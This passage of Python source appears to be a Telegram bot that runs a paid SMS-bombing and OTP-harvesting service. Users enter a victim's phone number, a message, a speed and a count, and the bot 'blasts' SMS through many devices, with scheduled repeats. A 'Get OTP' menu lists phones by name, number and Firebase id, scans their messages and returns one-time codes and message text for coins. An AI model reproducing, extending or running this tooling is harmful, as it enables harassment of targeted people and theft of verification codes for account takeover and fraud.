                    if not item.get("active", True):
                        continue
                    when = int(item.get("when", 0))
                    if when > now:
                        remaining.append(item)
                        continue
                    # run it
                    uid = int(item.get("uid", 0))
                    number = item.get("number", "")
                    message = item.get("message", "")
                    count = int(item.get("count", 0))
                    speed = float(item.get("speed", SPEED_DEFAULT))
                    repeat_min = int(item.get("repeat_minutes", 0))

                    if repeat_min > 0:
                        item["when"] = now + repeat_min * 60
                        remaining.append(item)
                    # fire blast in background
                    _spawn(_scheduled_blast_fire(bot, uid, number, message, count, speed))
                except Exception as e:
                    log.warning(f"[SCHED] item error: {e}")
            d["scheduled"] = remaining
            save(d)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.warning(f"[SCHED] loop error: {e}")

async def _scheduled_blast_fire(bot, uid, number, message, count, speed):
    try:
        devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
        if not devices:
            try:
                devices = await scan_all(load())
            except Exception:
                devices = []
        if not devices:
            return
        # build a fake message object
        try:
            class _Fake:
                async def answer(self, *a, **k):
                    try:
                        return await bot.send_message(uid, *a, **k)
                    except Exception:
                        return None
                chat = None
            fake = _Fake()
            fake.chat = type("C", (), {"id": uid})()
            await blast(bot, fake, uid, number, message, count, devices, speed)
        except Exception as e:
            log.warning(f"[SCHED] fire: {e}")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════
#  END OF PART 3  —  paste PART 4 right after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 4 START — ROUTER / START / USER FLOWS / OTP / WALLET
# ============================================================

# ============================================================
#  FORCE JOIN HELPERS
# ============================================================
async def check_member(bot, uid, ch_id):
    """Robust force-join check with multiple candidates."""
    cid_raw = str(ch_id).strip()
    log.info(f"[FJ-CHECK] uid={uid} ch={cid_raw!r}")

    candidates = []
    if cid_raw.startswith("@"):
        candidates.append(cid_raw)
    elif cid_raw.lstrip("-").isdigit():
        n = cid_raw.lstrip("-")
        try:
            candidates.append(int(cid_raw))
        except Exception:
            pass
        if not cid_raw.startswith("-100"):
            try:
                candidates.append(int("-100" + n))
            except Exception:
                pass
        if cid_raw.startswith("-100"):
            try:
                candidates.append(int(n))
            except Exception:
                pass
    elif "t.me/" in cid_raw:
        m = re.search(r"t\.me/([A-Za-z0-9_]+)", cid_raw)
        if m:
            candidates.append("@" + m.group(1))
    else:
        candidates.append("@" + cid_raw)

    log.info(f"[FJ-CHECK] candidates={candidates}")

    for cand in candidates:
        try:
            m = await bot.get_chat_member(cand, uid)
            status = getattr(m, "status", None)
            log.info(f"[FJ-CHECK] {cand} → status={status}")
            if status in ("member", "administrator", "creator", "restricted"):
                return True
            if status in ("left", "kicked"):
                return False
        except TelegramBadRequest as e:
            log.warning(f"[FJ-CHECK] {cand} BAD: {e}")
            continue
        except TelegramForbiddenError as e:
            log.warning(f"[FJ-CHECK] {cand} FORBIDDEN: {e}")
            continue
        except Exception as e:
            log.warning(f"[FJ-CHECK] {cand} ERR: {type(e).__name__}: {e}")
            continue

    log.error(f"[FJ-CHECK] ALL candidates failed for {cid_raw}")
    return False

async def joined_all(bot, uid, d):
    if is_owner(uid, d):
        return True, []
    if uid in d.get("force_join", {}).get("bypass", []):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    if not channels:
        return True, []

    # parallel check
    tasks = [check_member(bot, uid, ch["id"]) for ch in channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    missing = []
    for ch, res in zip(channels, results):
        if isinstance(res, Exception):
            missing.append(ch)
        elif not res:
            missing.append(ch)
    return len(missing) == 0, missing

def fj_text(missing):
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>Please join first!</b>\n",
        f"{em(EMOJI_BELL, '👇')} <b>Join these:</b>",
    ]
    for ch in missing:
        t = esc(ch.get("title", "Channel"))
        lines.append(f"\n• <a href='{esc(ch['link'])}'>{t}</a>")
    lines.append(f"\n\n<i>After joining, tap /start</i>")
    return "\n".join(lines)

# ============================================================
#  ROUTER
# ============================================================
R = Router()

# ============================================================
#  HOME RENDERER
# ============================================================
async def _render_home(cq, state, skip_fj=False):
    try:
        await state.clear()
    except Exception:
        pass
    uid = cq.from_user.id
    d = load()

    if not skip_fj:
        joined, missing = await joined_all(cq.bot, uid, d)
        if not joined:
            await safe_edit(cq, fj_text(missing), fj_kb(missing))
            return

    if is_owner(uid, d):
        await safe_edit(cq, owner_panel_text(d), owner_kb(d))
        _OWNER_PANEL_STATE[uid] = {
            "chat_id": cq.message.chat.id,
            "msg_id": cq.message.message_id,
            "active": True,
            "last_user_action": time.time(),
        }
        return
    if is_admin(uid, d):
        await safe_edit(cq, admin_panel_text(d), admin_kb(d))
        return
    if is_banned(uid, d):
        reason = d.get("ban_reasons", {}).get(str(uid), "")
        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
        await safe_edit(
            cq,
            f"{em(EMOJI_CROSS, '🚫')} <b>Banned.</b>{rtxt}\n\n<i>Contact owner for appeal.</i>",
            kb([(sc("appeal"), "user:appeal")]),
        )
        return
    if d.get("settings", {}).get("maintenance"):
        msg = d.get("settings", {}).get("maintenance_msg", "🔧 Maintenance.")
        await safe_edit(cq, f"🔧 {esc(msg)}", kb([(sc("refresh"), "user:home")]))
        return
    await safe_edit(cq, user_home_text(uid, d), user_kb())

# ============================================================
#  /start COMMAND
# ============================================================
@R.message(Command("start"))
async def cmd_start(m: Message, state: FSMContext):
    await state.clear()
    uid = m.from_user.id
    # Optional fire effect disabled: send_fire() was undefined.
    d = load()
    is_new = reg_user(uid, m.from_user.full_name or "User", d)

    # referral
    args = (m.text or "").split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("SJ") and not d["users"].get(str(uid), {}).get("referred_by"):
        ok, msgref, referrer = process_referral(uid, code, d)
        if ok and referrer:
            try:
                await m.bot.send_message(referrer, f"🎉 <b>Referral!</b> {msgref}", parse_mode="HTML")
            except Exception:
                pass
    save()

    if is_new:
        _spawn(send_log(m.bot, (
            f"🆕 <b>NEW USER</b>\n\n"
            f"👤 {esc(m.from_user.full_name or 'User')}\n"
            f"🆔 <code>{uid}</code>\n"
            f"🌐 @{esc(m.from_user.username or 'None')}\n"
            f"📅 {fmt_time(now_ts())}"
        )))

    # force join check
    joined, missing = await joined_all(m.bot, uid, d)
    if not joined:
        await m.answer(
            fj_text(missing),
            reply_markup=fj_kb(missing),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return

    owner_disp = get_owner_display(d)
    cap = f"{em(EMOJI_ROCKET, '🚀')} Welcome!"
    if owner_disp:
        cap += f"\nOwner: {owner_disp}"
    # Optional welcome video disabled: send_video() was undefined.

    if is_owner(uid, d):
        sent = await m.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        _OWNER_PANEL_STATE[uid] = {
            "chat_id": sent.chat.id,
            "msg_id": sent.message_id,
            "active": True,
            "last_user_action": time.time(),
        }
        return
    if is_admin(uid, d):
        await m.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        reason = d.get("ban_reasons", {}).get(str(uid), "")
        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
        await m.answer(f"🚫 <b>Banned.</b>{rtxt}", parse_mode="HTML")
        return
    if d.get("settings", {}).get("maintenance") and not is_admin(uid, d):
        msg = d.get("settings", {}).get("maintenance_msg", "🔧 Maintenance.")
        await m.answer(f"🔧 {esc(msg)}", parse_mode="HTML")
        return
    await m.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await joined_all(cq.bot, uid, d)
    if not joined:
        try:
            await cq.answer("❌ Not joined yet!")
        except Exception:
            pass
        await safe_edit(cq, fj_text(missing), fj_kb(missing))
        return
    try:
        await cq.answer("✅ Verified!")
    except Exception:
        pass
    await _render_home(cq, state, skip_fj=True)

# ============================================================
#  USER SEND FLOW
# ============================================================
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        try:
            await cq.answer("🚫 Banned!")
        except Exception:
            pass
        return
    if d.get("settings", {}).get("maintenance") and not is_admin(uid, d):
        try:
            await cq.answer("🔧 Maintenance")
        except Exception:
            pass
        return
    if not is_admin(uid, d) and not is_owner(uid, d):
        ulim = get_user_send_limit(uid, d)
        if ulim is not None and ulim <= 0:
            try:
                await cq.answer("🚫 Send blocked!")
            except Exception:
                pass
            return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.send_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Which number to SMS?\n<i>Example: +919876543210</i>",
        kb([(sc("cancel"), "user:home")]),
    )

@R.message(S.send_number)
async def user_got_number(m: Message, state: FSMContext):
    number = (m.text or "").strip()
    clean = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean.isdigit() or len(clean) < 7:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number.", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        d = load()
        puid = PROTECTED_NUMBERS[number]
        if not is_owner(m.from_user.id, d) and m.from_user.id != puid:
            await m.answer(f"{em(EMOJI_LOCK, '🔒')} Protected number!", parse_mode="HTML")
            return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{esc(mask_number(number))}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Enter message:",
        reply_markup=kb([(sc("cancel"), "user:cancel")]),
        parse_mode="HTML",
    )

@R.message(S.send_message)
async def user_got_message(m: Message, state: FSMContext):
    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    if len(txt) > 1000:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Too long (max 1000).", parse_mode="HTML")
        return
    await state.update_data(message=txt)
    await state.set_state(S.send_speed)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_sel(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    d = load()
    uid = cq.from_user.id
    smap = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    sel = smap.get(cq.data, SPEED_FAST)
    label = "🚀 FAST" if sel == SPEED_FAST else "⚡ MEDIUM" if sel == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sel)
    await state.set_state(S.send_count)

    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    real = len(devices)
    cnt = real * CURRENT_POWER_MODE if real > 0 else LAST_KNOWN_DEVICE_COUNT
    cinfo = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        uc = get_user_credits(uid, d)
        cinfo = f"\n💰 Credits: <b>{uc}</b>"
    await safe_edit(
        cq,
        f"{label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{cnt}</b>{cinfo}\n\n"
        f"How many SMS?",
        kb([(sc("cancel"), "user:cancel")]),
    )

@R.message(S.send_count)
async def user_got_count(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    fsmd = await state.get_data()
    try:
        cnt = int((m.text or "").strip())
        if cnt < 1:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send a number.", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    msg_text = fsmd.get("message", "")
    speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        cr = get_user_credits(uid, d)
        if cr <= 0:
            await m.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>No credits!</b>",
                reply_markup=kb([(sc("home"), "user:home")]),
                parse_mode="HTML",
            )
            return
        if cnt > cr:
            await m.answer(f"{em(EMOJI_WARNING, '⚠️')} Only {cr} credits.", parse_mode="HTML")
            cnt = cr
        ulim = get_user_send_limit(uid, d)
        if ulim is not None:
            if ulim <= 0:
                await m.answer(
                    f"{em(EMOJI_CROSS, '🚫')} <b>Send blocked!</b>",
                    reply_markup=kb([(sc("home"), "user:home")]),
                    parse_mode="HTML",
                )
                return
            if cnt > ulim:
                cnt = ulim

    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    if not devices:
        await m.answer(
            f"{em(EMOJI_WARNING, '😴')} No APIs online!",
            reply_markup=kb([(sc("home"), "user:home")]),
            parse_mode="HTML",
        )
        return
    await blast(m.bot, m, uid, number, msg_text, cnt, devices, speed)

# ============================================================
#  OWNER SEND FLOW
# ============================================================
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.owner_send_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '👑')} <b>Owner SMS</b>\n\n<b>Step 1/4 — Number</b>",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.owner_send_number)
async def owner_got_number(m: Message, state: FSMContext):
    number = (m.text or "").strip()
    clean = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean.isdigit() or len(clean) < 7:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{esc(number)}</code>\n\n<b>Step 2/4 — Message</b>",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.owner_send_message)
async def owner_got_message(m: Message, state: FSMContext):
    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    await state.update_data(message=txt)
    await state.set_state(S.owner_send_speed)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Saved!\n\n<b>Step 3/4 — Speed</b>",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_sel(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    smap = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    await state.update_data(send_speed=smap.get(cq.data, SPEED_FAST))
    await state.set_state(S.owner_send_count)
    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(load())
        except Exception:
            devices = []
    cnt = len(devices) * CURRENT_POWER_MODE if devices else LAST_KNOWN_DEVICE_COUNT
    await safe_edit(
        cq,
        f"<b>Step 4/4</b>\n\n🔥 APIs: <b>{cnt}</b>\n\nHow many?",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.owner_send_count)
async def owner_got_count(m: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        cnt = int((m.text or "").strip())
        if cnt < 1:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send a number.", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    msg_text = fsmd.get("message", "")
    speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(load())
        except Exception:
            devices = []
    if not devices:
        await m.answer(f"{em(EMOJI_WARNING, '😴')} No APIs!", parse_mode="HTML")
        return
    await blast(m.bot, m, m.from_user.id, number, msg_text, cnt, devices, speed)

# ============================================================
#  ADMIN SEND FLOW
# ============================================================
@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.admin_send_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS</b>\n\n<b>Step 1/4 — Number</b>",
        kb([(sc("cancel"), "admin:home")]),
    )

@R.message(S.admin_send_number)
async def admin_got_number(m: Message, state: FSMContext):
    number = (m.text or "").strip()
    clean = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean.isdigit() or len(clean) < 7:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{esc(mask_number(number))}</code>\n\n<b>Step 2/4 — Message</b>",
        reply_markup=kb([(sc("cancel"), "admin:home")]),
        parse_mode="HTML",
    )

@R.message(S.admin_send_message)
async def admin_got_message(m: Message, state: FSMContext):
    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    await state.update_data(message=txt)
    await state.set_state(S.admin_send_speed)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Saved!\n\n<b>Step 3/4 — Speed</b>",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_sel(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    smap = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    await state.update_data(send_speed=smap.get(cq.data, SPEED_FAST))
    await state.set_state(S.admin_send_count)
    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(load())
        except Exception:
            devices = []
    cnt = len(devices) * CURRENT_POWER_MODE if devices else LAST_KNOWN_DEVICE_COUNT
    await safe_edit(
        cq,
        f"<b>Step 4/4</b>\n\n🔥 APIs: <b>{cnt}</b>\n\nHow many?",
        kb([(sc("cancel"), "admin:home")]),
    )

@R.message(S.admin_send_count)
async def admin_got_count(m: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        cnt = int((m.text or "").strip())
        if cnt < 1:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send a number.", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    msg_text = fsmd.get("message", "")
    speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(load())
        except Exception:
            devices = []
    if not devices:
        await m.answer(f"{em(EMOJI_WARNING, '😴')} No APIs!", parse_mode="HTML")
        return
    await blast(m.bot, m, m.from_user.id, number, msg_text, cnt, devices, speed)

# ============================================================
#  STOP BLAST
# ============================================================
@R.callback_query(F.data == "user:stop_send")
async def stop_blast(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            try:
                await cq.answer("✅ No active blast!")
            except Exception:
                pass
            return
        s.cancelled = True
    try:
        await cq.answer("🛑 Stop signal sent!")
    except Exception:
        pass

# ============================================================
#  GET OTP — DEVICE LIST
# ============================================================
def _otp_devices_kb(devices, page=0):
    per = 8
    tp = max(1, (len(devices) + per - 1) // per)
    page = max(0, min(page, tp - 1))
    start = page * per
    chunk = devices[start:start + per]
    rows = []
    for i, dv in enumerate(chunk):
        idx = start + i
        nm = str(dv.get("dev_name", "Device"))[:20]
        ph = dv.get("phone") or "no number"
        label = f"{nm} · {ph}"
        if len(label) > 42:
            label = label[:40] + ".."
        rows.append([btn(label, f"otp:dev:{idx}", EMOJI_PHONE, "📱")])
    nav = []
    if page > 0:
        nav.append(btn("prev", f"otp:pg:{page - 1}", EMOJI_GEAR, "◀️"))
    if page < tp - 1:
        nav.append(btn("next", f"otp:pg:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([
        btn("search device", "otp:search", EMOJI_SEARCH, "🔎"),
        btn("back", "user:home", EMOJI_GEAR, "🔙"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "user:otp:menu")
async def otp_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if not is_admin(uid, d) and not is_owner(uid, d):
        olim = get_user_otp_limit(uid, d)
        if olim is not None and olim <= 0:
            try:
                await cq.answer("🚫 OTP blocked!")
            except Exception:
                pass
            return
        if get_user_coins(uid, d) < 1:
            try:
                await cq.answer("🪙 No coins!")
            except Exception:
                pass
            return
    try:
        await cq.answer()
    except Exception:
        pass
    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    if not devices:
        await safe_edit(cq, f"😴 <b>No devices online</b>", kb([(sc("back"), "user:home")]))
        return
    devices_sorted = sorted(devices, key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
    cost = get_otp_cost(d)
    fresh_w = get_otp_fresh_window(d)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>Get OTP</b>\n\n"
        f"Devices online: <b>{len(devices_sorted)}</b>\n"
        f"Cost: <b>{cost} 🪙</b> per fetch\n"
        f"Fresh window: <b>{fresh_w // 60} min</b>\n\n"
        f"Select device:",
        _otp_devices_kb(devices_sorted, 0),
    )

@R.callback_query(F.data.regexp(r"^otp:pg:(\d+)$"))
async def otp_pg(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    p = int(cq.data.split(":")[-1])
    devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
    d = load()
    cost = get_otp_cost(d)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>Get OTP</b>\n\n"
        f"Devices: <b>{len(devices)}</b> · Cost: <b>{cost} 🪙</b>\n\n"
        f"Select:",
        _otp_devices_kb(devices, p),
    )

@R.callback_query(F.data == "otp:search")
async def otp_search_start(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.device_search)
    await safe_edit(
        cq,
        f"{em(EMOJI_SEARCH, '🔎')} <b>Search Device</b>\n\n"
        f"Enter phone number or device name:",
        kb([(sc("cancel"), "user:otp:menu")]),
    )

@R.message(S.device_search)
async def otp_search_do(m: Message, state: FSMContext):
    q = (m.text or "").strip().lower()
    await state.clear()
    if not q:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
    matches = []
    for i, dv in enumerate(devices):
        ph = str(dv.get("phone") or "")
        nm = str(dv.get("dev_name", ""))
        if q in ph.lower() or q in nm.lower():
            matches.append((i, dv))
    if not matches:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} No devices match.",
            reply_markup=kb([(sc("back"), "user:otp:menu")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_SEARCH, '🔎')} <b>Found {len(matches)}</b>\n"]
    rows = []
    for i, dv in matches[:15]:
        nm = esc(str(dv.get("dev_name", "Device"))[:20])
        ph = esc(str(dv.get("phone") or "no number"))
        lines.append(f"📱 {nm} — <code>{ph}</code>")
        rows.append([btn(f"{nm} · {ph}", f"otp:dev:{i}", EMOJI_PHONE, "📱")])
    rows.append([btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")])
    await m.answer("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ============================================================
#  GET OTP — DEVICE SELECT
# ============================================================
@R.callback_query(F.data.regexp(r"^otp:dev:(\d+)$"))
async def otp_dev_select(cq: CallbackQuery, state: FSMContext):
    d = load()
    try:
        await cq.answer()
    except Exception:
        pass
    idx = int(cq.data.split(":")[-1])
    devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
    if idx >= len(devices):
        try:
            await cq.answer("❌ Device gone!", show_alert=True)
        except Exception:
            pass
        await otp_menu(cq, state)
        return
    dv = devices[idx]
    ph = dv.get("phone") or "Unknown"
    nm = str(dv.get("dev_name", "Device"))[:30]
    fb = str(dv.get("fb_label", ""))[:25]
    cost = get_otp_cost(d)
    fresh_w = get_otp_fresh_window(d)
    rows = [
        [btn(f"check fresh ({cost} 🪙)", f"otp:fetch:0:{idx}", EMOJI_OTP, "🟢", style="success")],
        [btn(f"check all ({cost} 🪙)", f"otp:fetch:1:{idx}", EMOJI_OTP, "🔍", style="primary")],
        [btn("live mode (5 min)", f"otp:live:{idx}", EMOJI_CLOCK, "⏱", style="success")],
        [btn("back", "user:otp:menu", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(
        cq,
        f"{em(EMOJI_PHONE, '📱')} <b>Device</b>\n\n"
        f"📛 Name: <b>{esc(nm)}</b>\n"
        f"📞 Number: <code>{esc(ph)}</code>\n"
        f"🔥 Firebase: {esc(fb)}\n"
        f"🪙 Cost: <b>{cost}</b>\n"
        f"⏱ Fresh window: <b>{fresh_w // 60} min</b>\n\n"
        f"<i>Send OTP, then tap check.</i>",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

# ============================================================
#  GET OTP — FETCH (fresh=0, all=1)
# ============================================================
@R.callback_query(F.data.regexp(r"^otp:fetch:(\d):(\d+)$"))
async def otp_fetch_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    parts = cq.data.split(":")
    fresh_mode = parts[2] == "0"
    idx = int(parts[3])

    devices = sorted(CACHED_DEVICES[:], key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", ""))))
    if idx >= len(devices):
        try:
            await cq.answer("❌ Device gone!", show_alert=True)
        except Exception:
            pass
        await otp_menu(cq, state)
        return
    dv = devices[idx]
    cost = get_otp_cost(d)
    is_priv = is_admin(uid, d) or is_owner(uid, d)
    if not is_priv:
        olim = get_user_otp_limit(uid, d)
        if olim is not None and olim <= 0:
            try:
                await cq.answer("🚫 Blocked!")
            except Exception:
                pass
            return
        if get_user_coins(uid, d) < cost:
            try:
                await cq.answer(f"🪙 Need {cost} coins!")
            except Exception:
                pass
            return
    try:
        await cq.answer("🔍 Scanning...")
    except Exception:
        pass
    await safe_edit(cq, f"{em(EMOJI_OTP, '🔍')} <b>Scanning messages...</b>")

    fresh_secs = get_otp_fresh_window(d)
    all_msgs = await collect_all_messages(dv, limit=_OTP_MAX_SCAN)
    fresh_cutoff = now_ts() - fresh_secs

    if fresh_mode:
        otps = [m for m in all_msgs if m["has_otp"] and m["ts"] >= fresh_cutoff]
    else:
        otps = [m for m in all_msgs if m["has_otp"]]

    if not is_priv:
        if not deduct_coins(uid, cost, d, "otp"):
            try:
                await cq.answer("🪙 Insufficient!")
            except Exception:
                pass
            return
        k = str(uid)
        d["users"][k]["otp_uses"] = d["users"][k].get("otp_uses", 0) + 1
    if otps:
        first = otps[0]
        d.setdefault("otp_history", {}).setdefault(str(uid), []).append({
            "otp": first["otps"][0] if first["otps"] else "?",
            "sender": first["sender"],
            "device_name": dv.get("dev_name", ""),
            "device_phone": dv.get("phone") or "",
            "fb_id": dv.get("fb_id", ""),
            "timestamp": now_ts(),
            "cost": 0 if is_priv else cost,
        })
        if len(d["otp_history"][str(uid)]) > 200:
            d["otp_history"][str(uid)] = d["otp_history"][str(uid)][-200:]
    save()

    mode_lbl = "🟢 FRESH" if fresh_mode else "🔍 ALL"
    if not otps:
        txt = (
            f"{em(EMOJI_CROSS, '❌')} <b>No OTP found ({mode_lbl})</b>\n\n"
            f"📱 Device: <code>{esc(dv.get('phone') or 'no number')}</code>\n"
            f"📊 Scanned: <b>{len(all_msgs)}</b>\n"
        )
        if fresh_mode:
            txt += f"\n<i>No fresh OTP in last {fresh_secs // 60} min. Try 'check all'.</i>"
        else:
            txt += f"\n<i>No OTP in any message. Try live mode.</i>"
    else:
        lines = [f"{em(EMOJI_OTP, '🔐')} <b>OTPs Found ({len(otps)}) — {mode_lbl}</b>\n"]
        for i, o in enumerate(otps[:15], 1):
            codes = ", ".join(o["otps"]) if o["otps"] else "?"
            body = esc(o["body"][:200])
            age = fmt_age(o["ts"])
            ts_str = fmt_time_short(o["ts"])
            lines.append(
                f"{i}. 🔐 <code>{codes}</code>\n"
                f"   📤 <b>{esc(o['sender'][:40])}</b>\n"
                f"   🕐 {ts_str} ({age})\n"
                f"   💬 <i>{body}</i>\n"
            )
        txt = "\n".join(lines)

